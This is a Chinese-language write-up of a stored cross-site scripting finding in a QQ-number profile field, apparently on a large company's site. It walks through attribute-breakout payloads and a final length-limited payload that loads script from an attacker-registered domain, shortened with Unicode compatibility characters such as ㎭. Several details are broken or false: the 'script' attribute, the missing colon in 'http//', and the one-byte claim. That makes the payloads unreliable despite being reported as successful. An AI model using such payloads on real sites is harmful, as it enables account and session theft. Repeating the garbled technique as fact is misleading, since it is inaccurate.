# [](#header-1)1、前期资产搜集阶段

前期资产搜集阶段很艰难困苦，使用不少资产搜索框架，均无法搜寻到大量有价值的资产信息  
(毕竟人家大厂的工程师也不是吃素的)  
  
就这样持续了几天，在看了将近七八十个站点后，终于发现了可疑xss注入点  
# [](#header-1)2、前期注入尝试阶段
在某子域下的某站点内的个人信息处，发现qq号信息竟然没有经过过滤  
于是仔细钻研qq号信息这个点，发现了以下规律  
1、qq号信息处可以填任意utf-8码字符，但是返回的网页会过滤<>  
2、qq号可作为公开信息展示在个人主页上，非常方便构造储存型xss  
3、qq号处处于某标签的value中  
4、qq号限制20长度字符，并且是后端硬校验，常规方法无法突破  

  
于是有机可乘的点就来了  
既然qq号处是处于某标签的value中，那么就无需<>号了，直接先""绕过，尝试构造新的标签参数  
```js
  " script="
```
成功，并且没有任何的过滤  
  
再试试能否执行script函数  
```js
  " script="alert(1)
```
成功  
  
这么个简单的脚本，肯定无法达到储存型xss要求  
由于长度限制在20，我们想要执行更多js代码，必须引入外部url里面的script  
通过人脑极限压缩大法，我们最终将执行外部url的payload极限压缩到15个字符  
payload：
```js
  " script=http//[填写域名]
```
总长度为15，我们填写的域名不能超过5字符，非常的危险  
当时就想到了短域名等方案，但都太长了  
  
经过我苦苦思考，还是想到了一个特别奇淫巧计的东西能利用：utf-8编码符号  
众所周知，utf-8字符集里有各种各样的字母符号，比如像：  
```
™	8482	2122
℡	8481	2121
™	8482	2122
㎭
```
但绝大多数人不知道的是，在浏览器域名解析这些字母符号时，会自动按以下格式转换成英文字母：  
```
™  tm
℡  tel
™  tm
㎭  rad
```
这些字母符号无论解析出来的英文有多长，都仅占用一个字节  
这样，注册一个域名radq.cc，无论是使用㎭q.cc还是radq.cc，都能顺利C类解析到同一源ip  
这样就好办了，不用花大价钱注册5长度域名，只需注册一个包含特殊字符的7长度的小域名就可以了  
  
# [](#header-1)3、中期payload注入阶段
注册了radq.cc，在该域名下挂js脚本，顺利注入  
final payload:  
```js
  " script=http//㎭q.cc
```
